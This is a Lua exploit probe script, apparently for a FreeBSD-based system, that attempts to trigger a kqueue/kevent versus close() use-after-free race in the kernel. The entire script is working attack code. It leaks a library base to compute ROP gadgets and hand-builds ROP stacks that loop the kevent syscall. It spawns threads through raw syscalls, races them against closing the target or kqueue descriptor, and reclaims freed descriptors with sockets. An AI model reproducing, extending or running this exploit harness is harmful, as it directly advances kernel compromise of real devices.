-- CRASH_CLASS: HIGH
-- PROBE 94b: kqueue + close race — knote UAF via kevent vs close
--
-- CVE-2023-5369 class: kevent(EV_ADD) registers a knote on target fd.
-- close(target) runs knote_fdclose to remove knotes. If kqueue_register
-- creates a knote AFTER knote_fdclose walks the list, the knote
-- references a freed struct file → UAF.
--
-- Sections:
--   A) Gate: verify kqueue/kevent work on 14.10
--   B) 1 child loops kevent(EV_ADD), main close(target) — basic race
--   C) 4 children loop kevent(EV_ADD), main close(target) + reclaim
--   D) 1 child loops kevent(EV_ADD), main close(KQ) — kqueue fd race

print("=== PROBE 94b: KQUEUE CLOSE RACE ===")
print("")
collectgarbage("stop")

local function N(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t={}; for k,v in pairs(syscall.pipe) do t[k]=v end
    t.syscall_no=n; setmetatable(t,getmetatable(syscall.pipe)); return t
end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function rd(a)
    local ok,v=pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok,v=pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function z(b,n) for o=0,n-4,4 do wd(b+o,0) end end

local stub=syscall.pipe.fn_addr
local SA=syscall.syscall_address
if not SA then print("NO syscall_address") return end
local pid=N(native.fcall_with_rax(stub,20))
print("pid="..pid)

local mm=mk(477); local tc=mk(430); local c624=mk(624)

local inf=memory.alloc(0x200); wd(inf,0x160)
pcall(function() mk(593)(uint64(0),inf) end)
local elo=rd(inf+0x108) or 0; local ehi=rd(inf+0x10C) or 0
if ehi<0 then ehi=ehi+0x100000000 end
if elo<0 then elo=elo+0x100000000 end
local PRAX=uint64(string.format("0x%X%08X",ehi,elo+0x992))
local PRDI=uint64(string.format("0x%X%08X",ehi,elo+0xC9DFE))
local PRSI=uint64(string.format("0x%X%08X",ehi,elo+0xD77D))
print("gadgets OK")

local _DI=0x048; local _SI=0x050; local _DX=0x058
local _R10=0x060; local _R8=0x068; local _R9=0x070; local _AX=0x078
local _CS=0x0C0; local _FL=0x0D0; local _IP=0x0E0
local _SP=0x0F8; local _SS=0x100; local _MG=0x108; local _TP=0x110

local MAX_CH=60
local STK_PG=1; local PG_PER_CHILD=STK_PG+1
local TOTAL_PG=2+MAX_CH*PG_PER_CHILD
print(string.format("ch=%d pg=%d", MAX_CH, TOTAL_PG))

local ok_m,region=pcall(function()
    return mm(uint64(0),uint64(TOTAL_PG*0x4000),uint64(3),
        uint64(0x1002),uint64(0xFFFFFFFF),uint64(0))
end)
if not ok_m then print("MMAP FAIL") return end
local R=N(region)
print(string.format("region=0x%X",R))

local ts=R; wq(ts,uint64(999)); wq(ts+8,uint64(0))
local sl2=R+0x20; wq(sl2,uint64(0)); wq(sl2+8,uint64(2000000))
local sl5=R+0x40; wq(sl5,uint64(0)); wq(sl5+8,uint64(5000000))
local sl20=R+0x60; wq(sl20,uint64(0)); wq(sl20+8,uint64(20000000))
local tb=R+0x80
local sv_buf=R+0x90

-- struct kevent for EV_ADD + EVFILT_READ
-- layout: ident(8) + filter(2) + flags(2) + fflags(4) + data(8) + udata(8) = 32
local kev_add=R+0x200; z(kev_add, 32)
-- ident updated per round
-- offset 0x08: dword = (flags << 16) | (filter & 0xFFFF)
-- EVFILT_READ=-1=0xFFFF, EV_ADD=0x0001
wd(kev_add+0x08, 0x0001FFFF)
wd(kev_add+0x0C, 0)          -- fflags
wq(kev_add+0x10, uint64(0))  -- data
wq(kev_add+0x18, uint64(0))  -- udata

-- struct kevent for EV_DELETE + EVFILT_READ
local kev_del=R+0x220; z(kev_del, 32)
wd(kev_del+0x08, 0x0002FFFF) -- EVFILT_READ, EV_DELETE=0x0002
wd(kev_del+0x0C, 0)
wq(kev_del+0x10, uint64(0))
wq(kev_del+0x18, uint64(0))

-- struct kevent for readback
local kev_out=R+0x240; z(kev_out, 32)

-- zero timespec for kevent polling
local kev_ts=R+0x260; wq(kev_ts,uint64(0)); wq(kev_ts+8,uint64(0))

local function vmc()
    local ok,c=pcall(function() return c624(uint64(0),uint64(0),uint64(0)) end)
    return ok and N(c) or -1
end

local cidx=0
local function child_stk(i) return R+0x4000*(2+i*PG_PER_CHILD) end
local function child_ctx(i) return R+0x4000*(2+i*PG_PER_CHILD+STK_PG) end

-- Spawn child that loops kevent(kq, changelist, 1, NULL, 0, NULL)
local function spawn_kevent(kq_fd, changelist_addr)
    if cidx>=MAX_CH then return nil end
    local si=cidx; cidx=cidx+1
    local stk=child_stk(si)
    local ctx=child_ctx(si)
    local stk_bytes=STK_PG*0x4000

    -- ROP: loop kevent. Each cycle = PRAX(8)+363(8)+SA(8) = 24 bytes
    local off=0
    local ncycles=math.floor((stk_bytes-200)/24)
    for i=1,ncycles do
        wq(stk+off,PRAX); off=off+8
        wq(stk+off,uint64(363)); off=off+8
        wq(stk+off,SA); off=off+8
    end
    -- tail: nanosleep(999s)
    wq(stk+off,PRDI); off=off+8; wq(stk+off,uint64(ts)); off=off+8
    wq(stk+off,PRSI); off=off+8; wq(stk+off,uint64(0)); off=off+8
    wq(stk+off,PRAX); off=off+8; wq(stk+off,uint64(240)); off=off+8
    wq(stk+off,SA); off=off+8

    z(ctx, 0x200)
    wq(ctx+_MG,uint64(0x480)); wd(ctx+_FL,0)
    wq(ctx+_TP,uint64(0x10000))
    wq(ctx+_CS,uint64(0x43)); wq(ctx+_SS,uint64(0x3B))
    wq(ctx+_IP,SA); wq(ctx+_SP,uint64(stk))
    wq(ctx+_AX,uint64(363))                   -- kevent
    wq(ctx+_DI,uint64(kq_fd))                 -- kq
    wq(ctx+_SI,uint64(changelist_addr))        -- changelist
    wq(ctx+_DX,uint64(1))                     -- nchanges=1
    wq(ctx+_R10,uint64(0))                    -- eventlist=NULL
    wq(ctx+_R8,uint64(0))                     -- nevents=0
    -- R9 (timeout) = 0 (NULL) — kernel skips timeout when nevents=0

    wq(tb,uint64(0))
    pcall(function() tc(uint64(ctx),uint64(tb),uint64(0)) end)
    return rq(tb)
end

local function mkpair()
    wq(sv_buf,uint64(0))
    local rv=N(native.fcall_with_rax(stub,135,1,1,0,N(sv_buf)))
    if rv~=0 then return nil,nil end
    return rd(sv_buf), rd(sv_buf+4)
end

-- ============================================================
-- A: GATE — verify kqueue + kevent work
-- ============================================================
print("--- A: GATE ---")

-- kqueue()
local gkq=N(native.fcall_with_rax(stub,362))
print("kqueue fd="..gkq)
if gkq<=0 then print("KQUEUE FAIL") return end

-- socketpair for target
local gA,gB=mkpair()
if not gA then print("PAIR FAIL") return end
print("target A="..gA.." B="..gB)

-- kevent EV_ADD from main via mk(363)
wq(kev_add, uint64(gA))  -- ident=target
local sc_kev=mk(363)
local ok1,rv1=pcall(function()
    return sc_kev(uint64(gkq),uint64(kev_add),uint64(1),
        uint64(0),uint64(0),uint64(0))
end)
print("EV_ADD rv="..(ok1 and tostring(N(rv1)) or "FAIL"))

-- kevent poll: any events ready?
z(kev_out, 32)
local ok2,rv2=pcall(function()
    return sc_kev(uint64(gkq),uint64(0),uint64(0),
        uint64(kev_out),uint64(1),uint64(kev_ts))
end)
local poll_rv=ok2 and N(rv2) or -999
local out_ident=rd(kev_out) or 0
print("poll rv="..poll_rv.." out_ident="..out_ident)

-- Write to B so A becomes readable
native.fcall_with_rax(stub,4,gB,N(ts),1)  -- write 1 byte to B
local ok3,rv3=pcall(function()
    return sc_kev(uint64(gkq),uint64(0),uint64(0),
        uint64(kev_out),uint64(1),uint64(kev_ts))
end)
local poll2=ok3 and N(rv3) or -999
local out2_ident=rd(kev_out) or 0
local out2_filt=rd(kev_out+8) or 0
print("poll after write rv="..poll2.." ident="..out2_ident.." filt=0x"..string.format("%X",out2_filt))

-- EV_DELETE
wq(kev_del, uint64(gA))
local ok4,rv4=pcall(function()
    return sc_kev(uint64(gkq),uint64(kev_del),uint64(1),
        uint64(0),uint64(0),uint64(0))
end)
print("EV_DELETE rv="..(ok4 and tostring(N(rv4)) or "FAIL"))

-- Child kevent test
print("spawn child kevent...")
wq(kev_add, uint64(gA))
spawn_kevent(gkq, kev_add)
native.fcall_with_rax(stub,240,sl20,0)
print("child canary="..N(native.fcall_with_rax(stub,20)))

native.fcall_with_rax(stub,6,gA)
native.fcall_with_rax(stub,6,gB)
native.fcall_with_rax(stub,6,gkq)
print("gate OK")

-- ============================================================
-- B: 1 child loops kevent(EV_ADD), main close(target)
-- ============================================================
print("")
print("--- B: 1 CHILD KEVENT vs CLOSE(TARGET) ---")

local hits_b=0
for round=1,10 do
    if cidx>=MAX_CH-1 then print("B: LIMIT") break end
    local kq=N(native.fcall_with_rax(stub,362))
    local tA,tB=mkpair()
    if not tA or kq<=0 then
        print("B"..round..": SETUP FAIL kq="..kq)
        if kq>0 then native.fcall_with_rax(stub,6,kq) end
        break
    end

    wq(kev_add, uint64(tA))
    spawn_kevent(kq, kev_add)
    native.fcall_with_rax(stub,240,sl2,0)

    native.fcall_with_rax(stub,6,tA)  -- RACE: close target

    native.fcall_with_rax(stub,240,sl5,0)
    local c=N(native.fcall_with_rax(stub,20))
    if c~=pid then hits_b=hits_b+1; print(string.format("B%02d: !! CANARY=%d",round,c)) end
    if round%5==0 then print(string.format("B%02d: ok ch=%d",round,cidx)) end
    native.fcall_with_rax(stub,6,tB)
    native.fcall_with_rax(stub,6,kq)
end
print("B: hits="..hits_b)

-- ============================================================
-- C: 4 children loop kevent(EV_ADD), main close(target) + reclaim
-- ============================================================
print("")
print("--- C: 4 CHILDREN KEVENT vs CLOSE+RECLAIM ---")

local hits_c=0
local reclaim=0
for round=1,8 do
    if cidx>=MAX_CH-4 then print("C: LIMIT") break end
    local kq=N(native.fcall_with_rax(stub,362))
    local tA,tB=mkpair()
    if not tA or kq<=0 then
        if kq>0 then native.fcall_with_rax(stub,6,kq) end
        break
    end

    wq(kev_add, uint64(tA))
    for i=1,4 do spawn_kevent(kq, kev_add) end
    native.fcall_with_rax(stub,240,sl2,0)

    native.fcall_with_rax(stub,6,tA)  -- RACE: close target
    -- reclaim fd tA with AF_INET (different type)
    local nf=N(native.fcall_with_rax(stub,97,2,2,0))
    if nf==tA then reclaim=reclaim+1 end

    native.fcall_with_rax(stub,240,sl5,0)
    local c=N(native.fcall_with_rax(stub,20))
    if c~=pid then hits_c=hits_c+1; print(string.format("C%02d: !! CANARY=%d",round,c)) end
    if round%4==0 then
        print(string.format("C%02d: ok ch=%d recl=%d/%d",round,cidx,reclaim,round))
    end
    if nf>0 then native.fcall_with_rax(stub,6,nf) end
    native.fcall_with_rax(stub,6,tB)
    native.fcall_with_rax(stub,6,kq)
end
print(string.format("C: hits=%d recl=%d", hits_c, reclaim))

-- ============================================================
-- D: 1 child loops kevent, main close(KQ) — kqueue fd race
-- ============================================================
print("")
print("--- D: CHILD KEVENT vs CLOSE(KQ) ---")

local hits_d=0
for round=1,5 do
    if cidx>=MAX_CH-1 then print("D: LIMIT") break end
    local kq=N(native.fcall_with_rax(stub,362))
    local tA,tB=mkpair()
    if not tA or kq<=0 then
        if kq>0 then native.fcall_with_rax(stub,6,kq) end
        break
    end

    -- Register event first from main
    wq(kev_add, uint64(tA))
    pcall(function() sc_kev(uint64(kq),uint64(kev_add),uint64(1),
        uint64(0),uint64(0),uint64(0)) end)

    spawn_kevent(kq, kev_add)
    native.fcall_with_rax(stub,240,sl2,0)

    native.fcall_with_rax(stub,6,kq)  -- RACE: close the KQUEUE fd

    native.fcall_with_rax(stub,240,sl5,0)
    local c=N(native.fcall_with_rax(stub,20))
    if c~=pid then hits_d=hits_d+1; print(string.format("D%02d: !! CANARY=%d",round,c)) end
    print(string.format("D%02d: canary=%d %s",round,c,c==pid and "OK" or "!!!"))
    native.fcall_with_rax(stub,6,tA)
    native.fcall_with_rax(stub,6,tB)
end
print("D: hits="..hits_d)

-- ============================================================
print("")
print(string.format("SUMMARY: B=%d C=%d D=%d ch=%d",hits_b,hits_c,hits_d,cidx))
print("canary="..N(native.fcall_with_rax(stub,20)))
print("=== 94b COMPLETE ===")
